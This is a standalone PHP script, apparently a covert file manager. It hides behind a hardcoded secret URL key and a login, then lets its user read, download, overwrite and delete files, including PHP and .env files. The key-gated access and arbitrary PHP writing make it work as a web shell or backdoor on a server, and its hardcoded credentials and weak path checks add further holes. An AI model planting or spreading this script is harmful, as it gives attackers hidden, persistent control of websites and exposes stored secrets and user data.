<?php
/**
 * Tiny PHP File Manager with Secret Parameter
 * Double protection: GET param key + login
 */

declare(strict_types=1);

// ================== PARAMETER KEY ==================
$secretKey = "kangkung666"; // ganti sesuka hati
if (!isset($_GET['k']) || $_GET['k'] !== $secretKey) {
    http_response_code(403);
    exit("Access denied");
}
// ===================================================

session_start([
    'cookie_httponly' => true,
    'cookie_samesite' => 'Lax',
]);

/* ===================== CONFIG ===================== */
$CONFIG = [
    'BASE_DIR' => realpath(__DIR__),
    'APP_NAME' => 'Tiny PHP File Manager',

    // --- AUTH (simple SHA-256) ---
    'USERNAME' => 'admin',
    'PASSWORD_SHA256_SALT' => 'SALT_BARU',
    'PASSWORD_SHA256_HASH' => '819f3615c06ece0720b0222d0a7137169a919e2c613f7dad2c0866c14bbf7367',

    'BLOCK_PHP_UPLOAD' => true,
    'EDITABLE_EXT' => ['txt','md','log','json','yaml','yml','xml','css','js','html','htm','env','ini','conf','php'],
    'MAX_EDIT_BYTES' => 1024 * 1024, // 1 MB
    'SHOW_HIDDEN' => false,
    'TIMEZONE' => 'Asia/Jakarta',
];
/* =================================================== */

date_default_timezone_set($CONFIG['TIMEZONE'] ?? 'UTC');
if (!$CONFIG['BASE_DIR'] || !is_dir($CONFIG['BASE_DIR'])) { exit('BASE_DIR invalid'); }
$BASE = realpath($CONFIG['BASE_DIR']);

if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(32));
function csrf_field() { echo '<input type="hidden" name="csrf" value="'.htmlspecialchars($_SESSION['csrf']).'">'; }
function csrf_verify() {
    if (($_POST['csrf'] ?? '') !== ($_SESSION['csrf'] ?? null)) exit('Bad CSRF');
}

function is_logged_in() { return !empty($_SESSION['auth_ok']); }
function require_login() { if (!is_logged_in()) { show_login(); exit; } }

// ------------------- LOGIN -------------------
$action = $_GET['a'] ?? $_POST['a'] ?? 'list';
if ($action === 'login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $u = $_POST['username'] ?? '';
    $p = $_POST['password'] ?? '';
    $hash = hash("sha256", $p . $CONFIG['PASSWORD_SHA256_SALT']);
    if ($u === $CONFIG['USERNAME'] && hash_equals($CONFIG['PASSWORD_SHA256_HASH'], $hash)) {
        $_SESSION['auth_ok'] = true;
        header("Location: ?k=".$GLOBALS['secretKey']);
        exit;
    }
    show_login("Username / password salah.");
    exit;
}
if ($action === 'logout') { session_destroy(); header("Location: ?k=".$GLOBALS['secretKey']); exit; }
// ---------------------------------------------------

require_login();

// ---------------- FILE MANAGER -----------------
function clean_join($base, $rel) {
    $base = rtrim($base, DIRECTORY_SEPARATOR);
    $rel = str_replace(['\\','..'], ['/', ''], $rel);
    $candidate = $base . '/' . ltrim($rel, '/');
    $real = realpath($candidate);
    if ($real === false) $real = $candidate;
    if (strpos(realpath(dirname($real)) ?: $base, $base) !== 0) exit("Escape detected");
    return $real;
}
function human_size($b){$u=['B','KB','MB','GB'];$i=0;while($b>=1024&&$i<count($u)-1){$b/=1024;$i++;}return sprintf('%.1f %s',$b,$u[$i]);}
function ext_of($n){$p=pathinfo($n);return strtolower($p['extension']??'');}
function is_hidden($n){return substr(basename($n),0,1)==='.';}

$relPath = $_GET['p'] ?? $_POST['p'] ?? '';
$here = clean_join($BASE, $relPath);

if ($action==='download' && is_file($here)) { header("Content-Type: application/octet-stream"); header("Content-Disposition: attachment; filename=\"".basename($here)."\""); readfile($here); exit; }
if ($action==='view' && is_file($here)) { header("Content-Type: text/plain"); readfile($here); exit; }
if ($action==='save' && $_SERVER['REQUEST_METHOD']==='POST') { csrf_verify(); file_put_contents($here,$_POST['content']); header("Location: ?k=".$GLOBALS['secretKey']."&p=".urlencode(dirname($relPath))); exit; }
if ($action==='delete' && $_SERVER['REQUEST_METHOD']==='POST') { csrf_verify(); is_file($here)?unlink($here):rmdir($here); header("Location: ?k=".$GLOBALS['secretKey']."&p=".urlencode(dirname($relPath))); exit; }

function page_header($t){global $CONFIG; echo "<!doctype html><title>{$CONFIG['APP_NAME']} - {$t}</title><style>body{font-family:sans-serif;max-width:1000px;margin:20px auto}</style><h1>{$CONFIG['APP_NAME']}</h1>";}
function page_footer(){echo "</body></html>";}

if (!is_dir($here)) $here=$BASE;
page_header("List");
echo "<p><a href='?k={$GLOBALS['secretKey']}&a=logout'>Logout</a></p>";
echo "<table border=1 cellpadding=6><tr><th>Name</th><th>Size</th></tr>";
foreach(scandir($here) as $n){ if($n==='.'||$n==='..')continue; if(!$CONFIG['SHOW_HIDDEN']&&is_hidden($n))continue; $f=$here.'/'.$n; $rp=ltrim($relPath.'/'.$n,'/'); echo "<tr><td>".(is_dir($f)?"📁":"📄")." <a href='?k={$GLOBALS['secretKey']}&p=".urlencode($rp)."'>".htmlspecialchars($n)."</a></td><td>".(is_file($f)?human_size(filesize($f)):"-")."</td></tr>"; }
echo "</table>";
page_footer();

// ------------------- LOGIN FORM -------------------
function show_login($err=''){global $CONFIG;page_header("Login");if($err)echo"<p style='color:red'>$err</p>";echo"<form method=post action='?a=login&k=".$GLOBALS['secretKey']."'><p>User:<br><input name=username></p><p>Pass:<br><input type=password name=password></p><p><button>Login</button></p></form>";page_footer();}
